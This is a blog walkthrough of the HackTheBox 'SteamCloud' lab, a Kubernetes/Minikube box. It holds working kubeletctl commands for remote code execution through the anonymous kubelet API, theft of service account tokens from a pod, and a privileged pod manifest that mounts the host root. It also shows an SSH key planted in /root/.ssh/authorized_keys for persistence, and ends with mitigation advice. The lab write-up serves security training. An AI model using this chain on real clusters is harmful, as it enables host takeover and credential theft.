---
title: HackTheBox - SteamCloud
author: solidgoat
date: 2022-10-27 11:33:00 EDT
categories: [HackTheBox, Machines]
tags: [linux, ctf, hackthebox, htb, walkthrough, easy, minikube, kubernetes, containers, cloud, rce, remote code execution, account misconfiguration]
image:
  path: /assets/img/posts/SteamCloud/htb-steamcloud-logo.png
  width: 800
  height: 500
  alt: Walkthrough of SteamCloud from HackTheBox
---

## Overview

This is marked as an easy box. It's running Debian 10 with a Kubernetes API. Through misconfigurations, you're able to gather information, compromise secrets, and eventually spawn a new pod to gain privileged access to the underlying host.

### Tools Used

* Nmap
* [kubeletctl](https://github.com/cyberark/kubeletctl)
* [kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/)

## Enumeration

### Port Scan
Running an Nmap TCP scan on against all ports (`0 - 65536`) on `10.10.11.133` shows 7 open ports:

* `22`
* `2379`
* `2380`
* `8443`
* `10249`
* `10250`
* `10256`

The most important part of this scan comes from the informatoin disclosed from the SSL cert from port `8443`. This server seems to be running Minikube.

```
ssl-cert: Subject: commonName=minikube/organizationName=system:masters
Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
```

>Minikube is a lightweight Kubernetes implementation that creates a VM on your local machine and deploys a simple cluster containing only one node. Minikube is available for Linux, macOS, and Windows systems.

Taken from [kubernetes.io](https://kubernetes.io/docs/tutorials/kubernetes-basics/create-cluster/cluster-intro/)

```
# Nmap 7.92 scan initiated Fri Oct 14 23:32:02 2022 as: nmap -T4 -Pn -n -O --osscan-limit -sC -sV -p- --open -oA nmap-tcp-all-full --min-parallelism 100 --min-rate 2000 10.10.11.133
Nmap scan report for 10.10.11.133
Host is up (0.021s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
2379/tcp  open  ssl/etcd-client?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2022-10-14T17:13:24
|_Not valid after:  2023-10-14T17:13:24
| tls-alpn: 
|_  h2
2380/tcp  open  ssl/etcd-server?
| tls-alpn: 
|_  h2
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2022-10-14T17:13:24
|_Not valid after:  2023-10-14T17:13:24
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 74c28cb5-26a0-4969-8812-9d38f1f7c2b2
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 4105fb4d-27cd-4582-a002-b2a5166d9ad0
|     X-Kubernetes-Pf-Prioritylevel-Uid: 737f1077-bd5c-4a91-afd7-3714e14b45d8
|     Date: Sat, 15 Oct 2022 03:32:23 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: e51b38a8-f203-4354-b1f7-5f8ec0e1cfbc
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 4105fb4d-27cd-4582-a002-b2a5166d9ad0
|     X-Kubernetes-Pf-Prioritylevel-Uid: 737f1077-bd5c-4a91-afd7-3714e14b45d8
|     Date: Sat, 15 Oct 2022 03:32:23 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 197638d2-da96-41ac-8dd8-e47bdd51d99d
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 4105fb4d-27cd-4582-a002-b2a5166d9ad0
|     X-Kubernetes-Pf-Prioritylevel-Uid: 737f1077-bd5c-4a91-afd7-3714e14b45d8
|     Date: Sat, 15 Oct 2022 03:32:23 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2022-10-13T17:13:22
|_Not valid after:  2025-10-13T17:13:22
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=steamcloud@1665767608
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2022-10-14T16:13:26
|_Not valid after:  2023-10-14T16:13:26
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.92%T=SSL%I=7%D=10/14%Time=634A29C7%P=x86_64-pc-linux-g
SF:nu%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20e51b
SF:38a8-f203-4354-b1f7-5f8ec0e1cfbc\r\nCache-Control:\x20no-cache,\x20priv
SF:ate\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20
SF:nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x204105fb4d-27cd-4582-a002-b
SF:2a5166d9ad0\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20737f1077-bd5c-4a91
SF:-afd7-3714e14b45d8\r\nDate:\x20Sat,\x2015\x20Oct\x202022\x2003:32:23\x2
SF:0GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Status\",\"apiVersion
SF:\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidde
SF:n:\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"
SF:/\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(HTT
SF:POptions,233,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20197638d2-da
SF:96-41ac-8dd8-e47bdd51d99d\r\nCache-Control:\x20no-cache,\x20private\r\n
SF:Content-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosniff
SF:\r\nX-Kubernetes-Pf-Flowschema-Uid:\x204105fb4d-27cd-4582-a002-b2a5166d
SF:9ad0\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20737f1077-bd5c-4a91-afd7-3
SF:714e14b45d8\r\nDate:\x20Sat,\x2015\x20Oct\x202022\x2003:32:23\x20GMT\r\
SF:nContent-Length:\x20189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1
SF:\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x20U
SF:ser\x20\\\"system:anonymous\\\"\x20cannot\x20options\x20path\x20\\\"/\\
SF:\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(FourOh
SF:FourRequest,24A,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x2074c28cb5
SF:-26a0-4969-8812-9d38f1f7c2b2\r\nCache-Control:\x20no-cache,\x20private\
SF:r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosn
SF:iff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x204105fb4d-27cd-4582-a002-b2a51
SF:66d9ad0\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20737f1077-bd5c-4a91-afd
SF:7-3714e14b45d8\r\nDate:\x20Sat,\x2015\x20Oct\x202022\x2003:32:23\x20GMT
SF:\r\nContent-Length:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\
SF:"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x
SF:20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nic
SF:e\x20ports,/Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\
SF:":{},\"code\":403}\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/14%OT=22%CT=1%CU=37265%PV=Y%DS=2%DC=I%G=Y%TM=634A2A
OS:29%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST
OS:11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 14 23:34:01 2022 -- 1 IP address (1 host up) scanned in 119.52 seconds
```


### Information Gathering

Now that I know I'm dealing with a Kubernetes server, I did some research on Kubernetes pentesting and landed on an article from Optiv, [Kubernetes Attack Surface](https://www.optiv.com/insights/source-zero/blog/kubernetes-attack-surface), which gave good information on the different ports and information gathering techniques.

* Kube API Server
  * 443/TCP (Kubernetes API Port)
  * 6443/TCP (Kubernetes API Port)
  * 8443/TCP (Minikube API Port)
  * 8080/TCP (Insecure K8s API Port)
  * 10250/TCP (kubelet API)
  * 10251/TCP (kube-scheduler)
  * 10252/TCP (Controller-manager)
* etcd Client Server
  * 2379/TCP (etcd Storage)
  * 2380/TCP (etcd Storage)
  * 6666/TCP (etcd Storage)
* cAdvisor
  * 4194/TCP (Container Metrics)
* Health Check Calico Server
  * 9099/TCP (calico-felix)
* Metrics and Endpoints
  * 6782–4/TCP (weave)
* NodePort Service
  * 30000–32767/TCP

Initially, I tried to navigate to `https://10.10.11.133:8443`, but it looks like that's not possible anonymously. This was the same for the other directories called out in [Kubernetes Attack Surface](https://www.optiv.com/insights/source-zero/blog/kubernetes-attack-surface):

* `/api`
* `/api/v1`
* `/apis`
* `/apis/`
* `/apis/apps`
* `/apis/apps/v1`
* `/apis/autoscaling`
* `/apis/autoscaling/v1`
* `/apis/batch`
* `/apis/batch/v1`

```sh
$ curl -k https://10.10.11.133:8443
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {
    
  },
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {
    
  },
  "code": 403
}
```

Leveraging the techniques from [Kubernetes Attack Surface](https://www.optiv.com/insights/source-zero/blog/kubernetes-attack-surface), I downloaded [kubeletctl](https://github.com/cyberark/kubeletctl) and began running commands to gather some initial information from the host.

Created Pods.

```sh
$ ./kubeletctl_linux_amd64 pods --server 10.10.11.133
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ kube-proxy-mwd64                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ coredns-78fcd69978-79g2z           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
```

`nginx` and `kube-proxy-mwd64` appear to be capable of running remote commands.

```sh
$ ./kubeletctl_linux_amd64 scan rce --server 10.10.11.133
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.10.11.133 │ kube-proxy-mwd64                   │ kube-system │ kube-proxy              │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ coredns-78fcd69978-79g2z           │ kube-system │ coredns                 │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 3 │              │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 4 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 5 │              │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 6 │              │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 7 │              │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 8 │              │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
```

## Initial Foothold

Since there are two pods (`nginx` and `kube-proxy-mwd64`) that I can run commands on, let's see what information can be gathered.

I appear to be running as `root` and can browse the file system.

<img src="/assets/img/posts/SteamCloud/kubeletctl-rce-command-id-and-ls.png">

Looks like I can get the `user.txt` flag as well. However, it wasn't stored in its usual location (`/home/<profile>/user.txt`).

<img src="/assets/img/posts/SteamCloud/user-flag.png">

Unfortunately, I wasn't able to do the same on `kube-proxy-mwd64`. The `root.txt` flag is most likely located somewhere on the host itself.

## Privilege Escalation

### Reverse Shell Attempt (Failed)

>True Kubernetes Volumes are typically used as shared storage or for persistent storage across restarts. These are typically mounted as ext4 filesystems and can be identified with `grep -wF "ext4" /etc/mtab`.

Taken from [PayLoadAllTheThings - Kubernetes](https://gitlab.com/pentest-tools/PayloadsAllTheThings/-/tree/master/Kubernetes#rbac-configuration)

Following this information, I was able to see a few files and directories that were mounted, from what I originally believed to be on the host.

The one that I was most interested in was, `/root` and it was writeable, indicated by the `rw` flag.

```sh
$ ./kubeletctl_linux_amd64 run "grep -wF ext4 /etc/mtab" --pod nginx --namespace default --container nginx --server 10.10.11.133                                                                                                           
/dev/sda1 /root ext4 rw,relatime,errors=remount-ro 0 0                                                                                                                                                                                       
/dev/sda1 /dev/termination-log ext4 rw,relatime,errors=remount-ro 0 0                                                                                                                                                                        
/dev/sda1 /etc/resolv.conf ext4 rw,relatime,errors=remount-ro 0 0                                                                                                                                                                            
/dev/sda1 /etc/hostname ext4 rw,relatime,errors=remount-ro 0 0                                                                                                                                                                               
/dev/sda1 /etc/hosts ext4 rw,relatime,errors=remount-ro 0 0
```

Using `-r` flag with the `exec` in `kubeletctl` keeps the connection open instead of just running the command and killing the pipe. Running the following command drops me into a shell on the `nginx` pod where I was able to successfully create `/root/.ssh/authorized_keys` and upload my attaking machine's public key.

```
$ ./kubeletctl_linux_amd64 exec "/bin/sh" --pod nginx --namespace default --container nginx --server 10.10.11.133 -r
# touch /root/.ssh/authorized_keys
touch /root/.ssh/authorized_keys
# chmod -R 600 /root/.ssh
chmod -R 600 /root/.ssh
# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4HaimH0lmjsIQFAe5bsaq3E9M7f8DpNF5gXH7i57j+IDswgQSqrd6hkwzFApLZUtLI+AyAZDkhwbr+MOUd8/7ZSCmgDfk8Vu2HuIkGNgBL597V8lHCMSPpSwZGAw7e3798wmSKZoTDJVvCfrWwVdMks/iPiTQ/Qb+xQaieGLBwclxBWuNo/FTZRUD8VZiSI9IxTc3ar2A5twOTeGnrrUe/LUUII/8keUeYtfuBlhX5mjoDitRTbT4u8g9pAkrZRDMiK0PPdK/Ylx4bGymlydlHoU5zd2keQp0jlh0yWijOaUod7ApRojVYCHsoRXxfVSHHEDxMAuGZ8gI7M7urmLSAekLJ/RUZQaJwnwEqkJEW5hlIBtgT692GVpS4YZYS5gf2V69woCn4vwwX05eYr7bQSl+ehrEIEaRAvI9TrESKwm6FWhkBecIq1Q2l7du9L8xHRUrR1HlcBOIHqr2ue+iESP9uTNznrrfpsLO1baGZtPwZgkV8r24oylzKgQgsRs= kali@kali' > /root/.ssh/authorized_keys
```

Though, this was unsuccessful because I was unable to SSH to the host server; I don't believe the `/root` mount is actually on the Kubernetes host. And viewing `/etc/hostname` seemed to confirm that.

<img src="/assets/img/posts/SteamCloud/kubeletctl-rce-command-hostname.png">

`kube-proxy-mwd64` does appears to have `/etc/hosts` and `/etc/hostname` from the underlying host, but does not have any other file or directory that I was able to work with.

```sh
$ ./kubeletctl_linux_amd64 exec "cat /etc/hostname" --pod kube-proxy-d4dzq --namespace kube-system --container kube-proxy --server 10.10.11.133 -r
steamcloud

$ ./kubeletctl_linux_amd64 run "grep -wF ext4 /etc/mtab" --pod kube-proxy-mwd64 --namespace kube-system --container kube-proxy --server 10.10.11.133                                                                                       
/dev/sda1 /lib/modules ext4 ro,relatime,errors=remount-ro 0 0                                                                                                                                                                                
/dev/sda1 /dev/termination-log ext4 rw,relatime,errors=remount-ro 0 0                                                                                                                                                                        
/dev/sda1 /etc/resolv.conf ext4 rw,relatime,errors=remount-ro 0 0                                                                                                                                                                            
/dev/sda1 /etc/hostname ext4 rw,relatime,errors=remount-ro 0 0                                                                                                                                                                               
/dev/sda1 /etc/hosts ext4 rw,relatime,errors=remount-ro 0 0                                                                                                                                                                                  
/dev/sda1 /var/lib/kube-proxy ext4 ro,relatime,errors=remount-ro 0 0
```

### Evil Pod Creation

Since I was able to browse the file system, I was able to steal the service account tokens for `nginx` and `kube-proxy`.

By default, a container in the Kubernetes cluster will hold a service account token within its file system. If compromsied, they can be used to move laterally, or depending on the privilege of the service account, they can escalate privileges to compromise the entire cluster environment.

```
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/namespace
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

<img src="/assets/img/posts/SteamCloud/kubeletctl-rce-nginx-token.png">

I stored the stolen token in an environmental variable (`$KUBE_NGINX`) so my commands would be smaller and to allow me to easily reference it. The information from the `ca.crt` file I simply stored locally.

Side note: I will admit that I was interrogating the API for a good portion of this exercise using `curl` until I discovered that `kubectl` had `--server`, `--token`, and `--certificate-authority` switches. Here's one the command for the curious:

```sh
curl -k "https://10.10.11.133:8443/api/v1" --cacert "ca.crt" --header "Authorization: Bearer ${KUBE_NGINX}" --header "Content-Type: application/json"
```

The `nginx` token isn't capable of much in the `kube-system` namespace. Which was the same story with the `kube-system` token from the `kube-proxy-mwd64` pod.

```sh
$ ./kubectl --server https://10.10.11.133:8443 --token $KUBE_NGINX --certificate-authority ./ca.crt auth can-i --list --namespace=kube-system
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

However, I am able to create pods in the `default` namespace and mount volumes from the host server.

<img src="/assets/img/posts/SteamCloud/kubectl-auth-can-i-list.png">

Knowing this, I created a Pod template that would pull from the `nginx:1.14.2` image. Addtionally, it sets an endless loop, waiting for a connection, sets up the appropriate security flags to make the pod privileged, and also mounts the root directory of the underlying host into `/host`.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: noderootpod
  labels:
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: noderootpod
    image: nginx:1.14.2
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

Then I created it with by executing:

```sh
$ ./kubectl --server https://10.10.11.133:8443 --token $KUBE_NGINX --certificate-authority ./ca.crt get pods create -f noderoot.yml
```

This actually took three tries to get right because I thought that if I just set the `image` option to `nginx` without specifying a version and build, it would pull the latest it had access to. As you can see from `noderootpod` and `noderootpod2`.

```sh
$ ./kubectl --server https://10.10.11.133:8443 --token $KUBE_NGINX --certificate-authority ./ca.crt get pods          
NAME           READY   STATUS             RESTARTS   AGE
nginx          1/1     Running            0          2d5h
noderootpod    0/1     ImagePullBackOff   0          4h39m
noderootpod2   0/1     ImagePullBackOff   0          4h34m
noderootpod3   1/1     Running            0          4h33m
```

I was able to find that information running a describe against the already running `nginx` pod.
```sh
$ ./kubectl --server https://10.10.11.133:8443 --token $KUBE_NGINX --certificate-authority ./ca.crt describe pod nginx                                                                                                                     
Name:             nginx                                                                                                                                                                                                                      
Namespace:        default                                                                                                                                                                                                                    
Priority:         0
Service Account:  default
Node:             steamcloud/10.10.11.133
Start Time:       Mon, 24 Oct 2022 19:47:02 -0400
Labels:           <none>
Annotations:      <none>
Status:           Running
IP:               172.17.0.3
IPs:
  IP:  172.17.0.3
Containers:
  nginx:
    Container ID:   docker://ba0d72337ed26edfdd835a53ee4ff75b988baf5fb90d7387751ce61c3471ffa1
    Image:          nginx:1.14.2
    Image ID:       docker-pullable://nginx@sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d
    Port:           <none>
    Host Port:      <none>
    State:          Running
      Started:      Mon, 24 Oct 2022 19:47:03 -0400
    Ready:          True
    Restart Count:  0
    Environment:    <none>
    Mounts:
      /root from flag (rw)
      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-d6grv (ro)
...[snip]...
```

Now that I had an "evil" pod running with a volume mounted on the host server, I was able to get the `root.txt` flag.

<img src="/assets/img/posts/SteamCloud/root-flag.png">

### Extra Credit (SSH Access)

I wanted to SSH into the host server. I was finally able to drop my pubic key into `/root/.ssh/authorized_keys` and gain SSH access to the host server.

```
$ ./kubeletctl_linux_amd64 exec "chroot /host" --pod noderootpod3 --namespace default --container noderootpod3 --server 10.10.11.133 -r
# mkdir /root/.ssh
mkdir /root/.ssh
# touch /root/.ssh/authorized_keys
touch /root/.ssh/authorized_keys
# chmod 600 -R /root/.ssh
chmod 600 -R /root/.ssh
# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4HaimH0lmjsIQFAe5bsaq3E9M7f8DpNF5gXH7i57j+IDswgQSqrd6hkwzFApLZUtLI+AyAZDkhwbr+MOUd8/7ZSCmgDfk8Vu2HuIkGNgBL597V8lHCMSPpSwZGAw7e3798wmSKZoTDJVvCfrWwVdMks/iPiTQ/Qb+xQaieGLBwclxBWuNo/FTZRUD8VZiSI9IxTc3ar2A5twOTeGnrrUe/LUUII/8keUeYtfuBlhX5mjoDitRTbT4u8g9pAkrZRDMiK0PPdK/Ylx4bGymlydlHoU5zd2keQp0jlh0yWijOaUod7ApRojVYCHsoRXxfVSHHEDxMAuGZ8gI7M7urmLSAekLJ/RUZQaJwnwEqkJEW5hlIBtgT692GVpS4YZYS5gf2V69woCn4vwwX05eYr7bQSl+ehrEIEaRAvI9TrESKwm6FWhkBecIq1Q2l7du9L8xHRUrR1HlcBOIHqr2ue+iESP9uTNznrrfpsLO1baGZtPwZgkV8r24oylzKgQgsRs= kali@kali' > /root/.ssh/authorized_keys
```

<img src="/assets/img/posts/SteamCloud/root-ssh.png">

## Mitigation

<img src="/assets/img/posts/SteamCloud/kubernetes-architecture.png">

During this exercise, we are targetting the Kubelet API (`10250/TCP`) directly. Once the tokens were compromised, we were able to target the Kube API server (`8443/TCP`) and create a malicious pod.

By default, requests to the kubelet's HTTPS endpoint that are not rejected by other configured authentication methods are treated as anonymous requests, and given a username of `system:anonymous` and a group of `system:unauthenticated`.

Any request that is successfully authenticated (including an anonymous request) is then authorized. The default authorization mode is `AlwaysAllow`, which allows all requests.

There are two important things you can do to prevent this:
* Authentication: Disable anonymous requests to the Kubelet server
  * start the kubelet with the `--anonymous-auth=false` flag
* Authorization: Do not allow all requests and enable explicit authorization

More information about securing a Kubernetes cluster can be found on [Securing a Cluster](https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster/).